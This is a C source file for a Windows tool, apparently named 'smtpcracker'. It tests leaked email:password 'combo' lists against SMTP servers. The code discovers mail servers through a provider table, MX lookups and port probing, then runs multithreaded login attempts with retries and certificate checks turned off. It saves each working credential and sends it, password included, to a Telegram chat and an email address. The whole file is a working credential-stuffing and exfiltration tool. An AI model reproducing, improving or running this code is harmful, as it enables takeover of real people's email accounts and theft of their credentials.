#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <process.h>
#include <stdio.h>
#include <math.h>
#include <time.h>
#include <windns.h>
#include <strsafe.h>
#include <smtplib/smtp.h>
#include <globals.h>
#include <resource.h>
#include <core/checker.h>
#include <core/notifications.h> 
#include <ui/homepage.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Dnsapi.lib")

// --- Tuning Constants ---
#define MAX_RETRIES 2            
#define BASE_DELAY_SEC 0.5       
#define MAX_DELAY_SEC 5.0
#define CONNECT_TIMEOUT_SEC 2    
#define MAX_CACHE_ENTRIES 1000   

// --- Structures ---
typedef struct {
    char domain[128];
    char host[128];
    int port;
    int encryption; // 0=STARTTLS, 1=SSL
} KNOWN_PROVIDER;

typedef struct {
    char host[256];
    char port[16];
    int encryption_type;
    BOOL found;
} SMTP_CONFIG;

// --- Domain Cache Structure ---
typedef struct {
    char domain[128];
    SMTP_CONFIG config;
    BOOL valid;
} CACHE_ENTRY;

// Global Cache State
CACHE_ENTRY g_DomainCache[MAX_CACHE_ENTRIES];
CRITICAL_SECTION g_CacheCS;
// NEW: Critical section for file saving to prevent concurrency errors
CRITICAL_SECTION g_FileCS; 
int g_CacheCount = 0;

// Known providers
KNOWN_PROVIDER g_KnownProviders[] = {
    {"gmail.com", "smtp.gmail.com", 587, 0},
    {"googlemail.com", "smtp.gmail.com", 587, 0},
    {"outlook.com", "smtp-mail.outlook.com", 587, 0},
    {"hotmail.com", "smtp-mail.outlook.com", 587, 0},
    {"live.com", "smtp-mail.outlook.com", 587, 0},
    {"office365.com", "smtp.office365.com", 587, 0},
    {"yahoo.com", "smtp.mail.yahoo.com", 587, 0},
    {"yahoo.co.uk", "smtp.mail.yahoo.co.uk", 587, 0},
    {"aol.com", "smtp.aol.com", 587, 0},
    {"icloud.com", "smtp.mail.me.com", 587, 0},
    {"me.com", "smtp.mail.me.com", 587, 0},
    {"zoho.com", "smtp.zoho.com", 587, 0},
    {"protonmail.com", "smtp.protonmail.com", 587, 0},
    {"tutanota.com", "smtp.tutanota.com", 587, 0}
};

int g_ScanPorts[] = {587, 465, 25, 2525, 993, 995};

WORKER_STATE g_state = {0};

// --- Prototypes ---
void LogMessageAsync(const wchar_t* fmt, ...);
BOOL GetHostIP(const char* host, struct sockaddr_in* outAddr);
BOOL CheckConnection(struct sockaddr_in* addr, int port);
void DiscoverServer(const char* email, SMTP_CONFIG* config);
BOOL ResolveMX(const char* domain, char* outMxHost, size_t size);
double CalculateRetryDelay(int attempt);
void InitCache();
BOOL GetCachedConfig(const char* domain, SMTP_CONFIG* outConfig);
void AddToCache(const char* domain, SMTP_CONFIG* config);

// --- Core Worker ---
unsigned __stdcall SmtpThreadProc(void* param) {
    srand(GetCurrentThreadId() + (unsigned int)time(NULL));

    // --- PREPARE SETTINGS ---
    char ansi_TgToken[256] = {0};
    char ansi_TgChatID[256] = {0};
    char ansi_TestEmail[256] = {0};
    char ansi_SaveFile[MAX_PATH] = {0}; 

    // Convert Telegram Settings
    if (g_settings.telegramToken[0] != 0) 
        WideCharToMultiByte(CP_ACP, 0, g_settings.telegramToken, -1, ansi_TgToken, 256, NULL, NULL);
    if (g_settings.telegramID[0] != 0) 
        WideCharToMultiByte(CP_ACP, 0, g_settings.telegramID, -1, ansi_TgChatID, 256, NULL, NULL);
    
    // Convert Test Email
    if (g_settings.testEmail[0] != 0) 
        WideCharToMultiByte(CP_ACP, 0, g_settings.testEmail, -1, ansi_TestEmail, 256, NULL, NULL);

    // --- NEW: FORCE SAVE TO EXE DIRECTORY LOGIC ---
    // 1. Get the full path of the running executable (e.g., D:\Courses\smtpcracker\smtp_c\smtpcracker.exe)
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    // 2. Strip off the filename to get just the directory (e.g., D:\Courses\smtpcracker\smtp_c\)
    char* lastSlash = strrchr(exePath, '\\');
    if (lastSlash) *lastSlash = '\0'; 

    // 3. Resolve the Save Filename
    if (g_settings.saveFileName[0] != 0) {
        char tempName[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, g_settings.saveFileName, -1, tempName, MAX_PATH, NULL, NULL);

        // If user provided an ABSOLUTE path (e.g., "C:\Logs\test.txt"), use it as is.
        // If user provided a RELATIVE path (e.g., "results.txt"), prepend the EXE directory.
        if (strchr(tempName, ':')) {
             StringCchCopyA(ansi_SaveFile, MAX_PATH, tempName);
        } else {
             StringCchPrintfA(ansi_SaveFile, MAX_PATH, "%s\\%s", exePath, tempName);
        }
    } else {
        // Default if empty: exe_folder\results.txt
        StringCchPrintfA(ansi_SaveFile, MAX_PATH, "%s\\results.txt", exePath);
    }
    // ----------------------------------------------

    while (g_state.running) {
        int idx = -1;
        // 1. Fetch Work
        WaitForSingleObject(g_state.mutex, INFINITE);
        if (g_state.current < g_state.total) idx = g_state.current++;
        ReleaseMutex(g_state.mutex);

        if (idx == -1) break;

        RESULT_DATA* res = calloc(1, sizeof(RESULT_DATA));
        char* combo = g_state.combos[idx];

        // Parse Combo
        if (sscanf(combo, "%[^:]:%s", res->email, res->pass) != 2) {
            free(res);
            continue;
        }

        LogMessageAsync(L"🔍 Testing %S...", res->email);

        // --- Step 1: Server Discovery ---
        SMTP_CONFIG config = {0};
        DiscoverServer(res->email, &config);

        if (!config.found) {
            StringCchCopyA(res->status, ARRAYSIZE(res->status), "No SMTP server found");
            StringCchCopyA(res->host, ARRAYSIZE(res->host), "N/A");
            StringCchCopyA(res->port, ARRAYSIZE(res->port), "N/A");
            
            LogMessageAsync(L"❌ No SMTP server found for %S", res->email);
            PostMessage(main_hwnd, WM_WORKER_RESULT, 0, (LPARAM)res);
            continue;
        }

        StringCchCopyA(res->host, ARRAYSIZE(res->host), config.host);
        StringCchCopyA(res->port, ARRAYSIZE(res->port), config.port);

        // --- Step 2: Authentication ---
        BOOL isAuthenticated = FALSE;
        struct smtp* ctx = NULL;
        char errorMsg[256] = "Connection Error";

        for (int attempt = 0; attempt <= g_settings.maxRetries; attempt++) {
            if (!g_state.running) break;

            enum smtp_connection_security security = SMTP_SECURITY_STARTTLS;
            if (config.encryption_type == 1) security = SMTP_SECURITY_TLS;

            int ret = smtp_open(config.host, config.port, security, SMTP_NO_CERT_VERIFY, NULL, &ctx);
            
            if (ret == SMTP_STATUS_OK) {
                int authRet = smtp_auth(ctx, SMTP_AUTH_LOGIN, res->email, res->pass);
                if (authRet == SMTP_STATUS_OK) {
                    isAuthenticated = TRUE;
                    StringCchCopyA(res->status, ARRAYSIZE(res->status), "Valid");
                    
                    const char* encStr = (config.encryption_type == 1) ? "SSL" : "STARTTLS";
                    LogMessageAsync(L"✅ Valid: %S on %S:%S (%S)", res->email, config.host, config.port, encStr);

                    // --- SUCCESS HANDLER: Send Notifications ---
                    SMTP_RESULT validHit;
                    StringCchCopyA(validHit.host, 256, config.host);
                    validHit.port = atoi(config.port);
                    StringCchCopyA(validHit.email, 256, res->email);
                    StringCchCopyA(validHit.password, 256, res->pass);

                    // 1. Auto-Save to File (THREAD SAFE & LOCATION FIXED)
                    EnterCriticalSection(&g_FileCS);
                    SaveResultToFile(ansi_SaveFile, &validHit);
                    LeaveCriticalSection(&g_FileCS);

                    // 2. Telegram Notification
                    if (ansi_TgToken[0] != '\0' && ansi_TgChatID[0] != '\0') {
                        if (SendDetailedTelegram(ansi_TgToken, ansi_TgChatID, &validHit)) {
                            LogMessageAsync(L"📤 Telegram sent for %S", res->email);
                        } else {
                            LogMessageAsync(L"⚠️ Telegram send failed for %S", res->email);
                        }
                    }

                    // 3. Email Notification
                    if (ansi_TestEmail[0] != '\0') {
                        SendEmailNotification(ansi_TestEmail, &validHit);
                        StringCchCopyA(res->delivery, ARRAYSIZE(res->delivery), "Sent");
                    } else {
                        StringCchCopyA(res->delivery, ARRAYSIZE(res->delivery), "Skipped");
                    }

                    break;
                } else {
                    StringCchCopyA(res->status, ARRAYSIZE(res->status), "Invalid credentials");
                    StringCchCopyA(errorMsg, 256, "Invalid credentials");
                    LogMessageAsync(L"❌ Invalid: %S - Invalid credentials", res->email);
                    smtp_close(ctx);
                    ctx = NULL;
                    break;
                }
            } else {
                snprintf(errorMsg, 256, "SMTP error: Connection unexpectedly closed");
                if (attempt < g_settings.maxRetries) {
                    double delay = CalculateRetryDelay(attempt);
                    Sleep((DWORD)(delay * 1000));
                } else {
                    StringCchCopyA(res->status, ARRAYSIZE(res->status), errorMsg);
                    LogMessageAsync(L"❌ Invalid: %S - %S", res->email, errorMsg);
                }
            }
        }

        if (ctx) smtp_close(ctx);
        if (!isAuthenticated) {
            StringCchCopyA(res->delivery, ARRAYSIZE(res->delivery), "N/A");
        }

        PostMessage(main_hwnd, WM_WORKER_RESULT, 0, (LPARAM)res);
    }
    
    return 0;
}

// --- Async Logger ---
void LogMessageAsync(const wchar_t* fmt, ...) {
    wchar_t* buf = calloc(512, sizeof(wchar_t));
    if (!buf) return;

    va_list args;
    va_start(args, fmt);
    StringCchVPrintfW(buf, 512, fmt, args);
    va_end(args);
    StringCchCatW(buf, 512, L"\r\n");

    PostMessageW(main_hwnd, WM_WORKER_LOG, 0, (LPARAM)buf);
}

// --- Process Control ---
#define WM_WORKER_RESET (WM_USER + 10)

void StartCheckingProcess() {
    if (!g_state.combos || g_state.total == 0) {
        MessageBoxW(main_hwnd, L"Please upload a combo file first!", L"Warning", MB_ICONWARNING);
        return;
    }

    if (g_state.running) {
        g_state.running = FALSE;
        SetWindowTextW(g_HomeUI.hBtnStart, L"Start Checking");
        LogMessageAsync(L"🛑 Stopping process...");
        return;
    }

    // Reset UI Counters
    PostMessage(main_hwnd, WM_WORKER_RESET, 0, 0);
    InitCache(); 

    g_state.current = 0;
    g_state.running = TRUE;
    
    SetWindowTextW(g_HomeUI.hBtnStart, L"Stop Checking");
    LogMessageAsync(L"🚀 Started checking %d combos with %d threads...", g_state.total, g_settings.numThreads);

    if (g_state.mutex) CloseHandle(g_state.mutex);
    g_state.mutex = CreateMutex(NULL, FALSE, NULL);

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    for (int i = 0; i < g_settings.numThreads; i++) {
        _beginthreadex(NULL, 0, SmtpThreadProc, NULL, 0, NULL);
    }
}

void HandleUploadCombo(HWND hwnd) {
    OPENFILENAMEW ofn = {0};
    wchar_t szFile[MAX_PATH] = {0};
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = hwnd;
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = sizeof(szFile) / sizeof(wchar_t);
    ofn.lpstrFilter = L"Text Files (*.txt)\0*.txt\0All Files (*.*)\0*.*\0";
    ofn.nFilterIndex = 1;
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;

    if (GetOpenFileNameW(&ofn)) {
        FILE* fp = _wfopen(szFile, L"r");
        if (!fp) return;

        if (g_state.combos) {
            for (int i = 0; i < g_state.total; i++) free(g_state.combos[i]);
            free(g_state.combos);
        }

        char line[512];
        int count = 0;
        while (fgets(line, sizeof(line), fp)) count++;

        rewind(fp);
        g_state.combos = malloc(sizeof(char*) * count);
        g_state.total = 0;

        while (fgets(line, sizeof(line), fp)) {
            line[strcspn(line, "\r\n")] = 0;
            if (strchr(line, ':') && strchr(line, '@')) { 
                g_state.combos[g_state.total++] = _strdup(line);
            }
        }
        fclose(fp);

        wchar_t status[64];
        StringCchPrintfW(status, 64, L"Combos Loaded: %d", g_state.total);
        SetWindowTextW(g_HomeUI.hLblCombos, status);
        
        LogMessageAsync(L"\n📁 Combo file loaded: %d items.", g_state.total);
    }
}

// --- CACHING LOGIC ---
static BOOL g_LocksInitialized = FALSE;

void InitCache() {
    if (!g_LocksInitialized) {
        InitializeCriticalSection(&g_CacheCS);
        InitializeCriticalSection(&g_FileCS); // Initialize File Lock
        g_LocksInitialized = TRUE;
    }
    
    g_CacheCount = 0;
    ZeroMemory(g_DomainCache, sizeof(g_DomainCache));
}

BOOL GetCachedConfig(const char* domain, SMTP_CONFIG* outConfig) {
    BOOL found = FALSE;
    EnterCriticalSection(&g_CacheCS);
    for (int i = 0; i < g_CacheCount; i++) {
        if (strcmp(g_DomainCache[i].domain, domain) == 0) {
            *outConfig = g_DomainCache[i].config;
            found = TRUE;
            break;
        }
    }
    LeaveCriticalSection(&g_CacheCS);
    return found;
}

void AddToCache(const char* domain, SMTP_CONFIG* config) {
    EnterCriticalSection(&g_CacheCS);
    for (int i = 0; i < g_CacheCount; i++) {
        if (strcmp(g_DomainCache[i].domain, domain) == 0) {
            LeaveCriticalSection(&g_CacheCS);
            return;
        }
    }
    if (g_CacheCount < MAX_CACHE_ENTRIES) {
        StringCchCopyA(g_DomainCache[g_CacheCount].domain, 128, domain);
        g_DomainCache[g_CacheCount].config = *config;
        g_DomainCache[g_CacheCount].valid = TRUE;
        g_CacheCount++;
    }
    LeaveCriticalSection(&g_CacheCS);
}

// --- OPTIMIZED DISCOVERY ---
void DiscoverServer(const char* email, SMTP_CONFIG* config) {
    char* at = strchr(email, '@');
    if (!at) return;
    char domain[128];
    StringCchCopyA(domain, 128, at + 1);
    _strlwr_s(domain, 128);

    if (GetCachedConfig(domain, config)) {
        char* type = config->encryption_type ? "SSL" : "STARTTLS";
        LogMessageAsync(L"🔍 Found SMTP server: %S:%S (%S) [Cached]", config->host, config->port, type);
        return;
    }

    for (int i = 0; i < sizeof(g_KnownProviders) / sizeof(KNOWN_PROVIDER); i++) {
        if (strcmp(domain, g_KnownProviders[i].domain) == 0) {
            StringCchCopyA(config->host, 256, g_KnownProviders[i].host);
            StringCchPrintfA(config->port, 16, "%d", g_KnownProviders[i].port);
            config->encryption_type = (g_KnownProviders[i].port == 465) ? 1 : 0;
            config->found = TRUE;
            
            AddToCache(domain, config);
            char* type = config->encryption_type ? "SSL" : "STARTTLS";
            LogMessageAsync(L"🔍 Found SMTP server: %S:%S (%S)", config->host, config->port, type);
            return;
        }
    }

    char mxHost[256] = {0};
    if (ResolveMX(domain, mxHost, 256)) {
        struct sockaddr_in mxAddr;
        if (GetHostIP(mxHost, &mxAddr)) {
            for (int i = 0; i < sizeof(g_ScanPorts)/sizeof(int); i++) {
                if (CheckConnection(&mxAddr, g_ScanPorts[i])) {
                    StringCchCopyA(config->host, 256, mxHost);
                    StringCchPrintfA(config->port, 16, "%d", g_ScanPorts[i]);
                    config->encryption_type = (g_ScanPorts[i] == 465) ? 1 : 0;
                    config->found = TRUE;
                    AddToCache(domain, config);
                    char* type = config->encryption_type ? "SSL" : "STARTTLS";
                    LogMessageAsync(L"🔍 Found SMTP server: %S:%S (%S)", config->host, config->port, type);
                    return;
                }
            }
        }
    }

    const char* prefixes[] = {"smtp.", "mail.", "mx."};
    for (int p = 0; p < 3; p++) {
        char guessHost[256];
        StringCchPrintfA(guessHost, 256, "%s%s", prefixes[p], domain);
        struct sockaddr_in guessAddr;
        if (!GetHostIP(guessHost, &guessAddr)) continue;

        for (int i = 0; i < sizeof(g_ScanPorts)/sizeof(int); i++) {
            if (CheckConnection(&guessAddr, g_ScanPorts[i])) {
                StringCchCopyA(config->host, 256, guessHost);
                StringCchPrintfA(config->port, 16, "%d", g_ScanPorts[i]);
                config->encryption_type = (g_ScanPorts[i] == 465) ? 1 : 0;
                config->found = TRUE;
                AddToCache(domain, config);
                char* type = config->encryption_type ? "SSL" : "STARTTLS";
                LogMessageAsync(L"🔍 Found SMTP server: %S:%S (%S)", config->host, config->port, type);
                return;
            }
        }
    }
}

BOOL GetHostIP(const char* host, struct sockaddr_in* outAddr) {
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, NULL, &hints, &res) != 0) return FALSE;
    if (res->ai_family == AF_INET) {
        memcpy(outAddr, res->ai_addr, sizeof(struct sockaddr_in));
    }
    freeaddrinfo(res);
    return TRUE;
}

BOOL CheckConnection(struct sockaddr_in* addr, int port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return FALSE;
    unsigned long iMode = 1;
    ioctlsocket(sock, FIONBIO, &iMode);
    struct sockaddr_in connectAddr;
    memcpy(&connectAddr, addr, sizeof(struct sockaddr_in));
    connectAddr.sin_port = htons(port);
    BOOL result = FALSE;
    if (connect(sock, (struct sockaddr*)&connectAddr, sizeof(connectAddr)) == SOCKET_ERROR) {
        if (WSAGetLastError() == WSAEWOULDBLOCK) {
            fd_set writeSet;
            FD_ZERO(&writeSet);
            FD_SET(sock, &writeSet);
            struct timeval tv;
            tv.tv_sec = CONNECT_TIMEOUT_SEC;
            tv.tv_usec = 0;
            if (select(0, NULL, &writeSet, NULL, &tv) > 0) result = TRUE;
        }
    } else {
        result = TRUE;
    }
    closesocket(sock);
    return result;
}

BOOL ResolveMX(const char* domain, char* outMxHost, size_t size) {
    PDNS_RECORD pDnsRecord;
    DNS_STATUS status = DnsQuery_A(domain, DNS_TYPE_MX, DNS_QUERY_STANDARD, NULL, &pDnsRecord, NULL);
    if (status == ERROR_SUCCESS && pDnsRecord) {
        PDNS_RECORD pRec = pDnsRecord;
        while (pRec) {
            if (pRec->wType == DNS_TYPE_MX) {
                WideCharToMultiByte(CP_ACP, 0, pRec->Data.MX.pNameExchange, -1, outMxHost, (int)size, NULL, NULL);
                DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
                return TRUE;
            }
            pRec = pRec->pNext;
        }
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    }
    return FALSE;
}

double CalculateRetryDelay(int attempt) {
    double delay = min(BASE_DELAY_SEC * pow(2, attempt), MAX_DELAY_SEC);
    double jitter = (rand() % 100) / 200.0; 
    return delay + (delay * jitter);
}